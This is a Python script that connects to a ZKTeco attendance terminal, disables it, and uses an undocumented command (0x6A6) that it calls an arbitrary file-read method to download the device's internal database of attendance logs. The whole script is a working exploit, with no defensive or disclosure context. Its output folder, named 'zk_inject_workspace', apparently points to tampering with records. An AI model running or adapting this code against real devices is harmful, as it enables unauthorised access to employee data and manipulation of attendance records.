#!/usr/bin/env python3
"""Download ZKDB.db using the working method from earlier."""
import sys
sys.path.insert(0, 'D:\\chamcong\\AttendanceSuite_Portable\\python\\Lib\\site-packages')
sys.stdout.reconfigure(encoding='utf-8')

import socket, struct, time, sqlite3, os
from zk import ZK, const
from struct import pack, unpack

DEVICE_IP = '172.16.0.214'
OUT_DIR = 'D:\\chamcong\\zk_inject_workspace'

def send_cmd(conn, command, data=b''):
    try:
        return conn._ZK__send_command(command, data, response_size=1024)
    except Exception as e:
        return {'status': False, 'error': str(e)}

def free_data(conn):
    send_cmd(conn, const.CMD_FREE_DATA, b'')

os.makedirs(OUT_DIR, exist_ok=True)

zk = ZK(DEVICE_IP, port=4370, timeout=15, password=0)
conn = zk.connect()
print('[+] Connected:', conn.get_firmware_version(), conn.get_platform())

try:
    before_att = conn.get_attendance_count()
    print('[*] BEFORE: ATTLOG={}'.format(before_att))
except: before_att = None

try: conn.disable_device()
except: pass

free_data(conn)
time.sleep(1)

# Use the working readfile approach (from zk_arbitrary_read.py)
print('\n[*] Downloading ZKDB.db via 0x6A6...')
r = send_cmd(conn, 0x6A6, b'/mnt/mtdblock/data/ZKDB.db\x00')
print('  Initial:', r)

sock = conn._ZK__sock
sock.settimeout(15)
total = b''
chunks = 0
start = time.time()
while time.time() - start < 60:  # max 60s
    try:
        chunk = sock.recv(65536)
        if not chunk: break
        if len(chunk) >= 16:
            top1, top2, tcp_len = unpack('<HHI', chunk[:8])
            zk_cmd = unpack('<H', chunk[8:10])[0]
            body = chunk[16:16+(tcp_len - 8)] if tcp_len > 8 else b''
            total += body
            chunks += 1
            if zk_cmd == 0x07D0 or zk_cmd == 2000:
                print('  [DONE] Got ACK_OK after {} chunks'.format(chunks))
                break
        else:
            # short chunk - might be end
            if chunks > 0: break
    except socket.timeout:
        print('  [TIMEOUT] after {} chunks'.format(chunks))
        break
    except Exception as e:
        print('  [ERR]', e)
        break

print('  Total: {} chunks, {} bytes'.format(chunks, len(total)))
out = os.path.join(OUT_DIR, 'downloaded_' + str(int(time.time())) + '.db')
with open(out, 'wb') as f:
    f.write(total)
print('  Saved:', out)

if total[:15] == b'SQLite format 3':
    print('  [VALID] SQLite magic OK')
    try:
        db = sqlite3.connect(out)
        cur = db.cursor()
        cur.execute('SELECT COUNT(*) FROM ATT_LOG')
        cnt = cur.fetchone()[0]
        print('  ATT_LOG count: {}'.format(cnt))
        db.close()
    except Exception as e:
        print('  SQLite open:', e)
else:
    print('  [INVALID] Not SQLite')

try: conn.enable_device()
except: pass
try: conn.disconnect()
except: pass
